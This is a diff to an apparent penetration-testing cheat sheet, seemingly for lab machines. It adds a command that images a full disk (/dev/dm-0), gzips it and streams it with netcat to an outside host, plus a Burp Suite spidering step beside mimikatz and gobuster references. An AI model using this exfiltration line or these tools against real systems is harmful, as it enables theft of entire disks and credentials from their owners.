@@ -37,6 +37,10 @@
 # Misc
 
 ## System Images
+### Transfer compressed image via netcat
+```
+dd if=/dev/dm-0 | gzip - | nc 10.10.14.23 3142
+```
 ### Convert to raw
 ```
 qemu-img convert vm.qcow2 vm.raw
@@ -467,6 +471,8 @@ mimikatz # misc::cmd
 ```
 
 # Web Application Enumeration
+## Burpsuite
+* Target > Site map > right click on host > Spider this host 
 
 ```
 gobuster dir -k -u https://10.10.10.7/ -w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt	
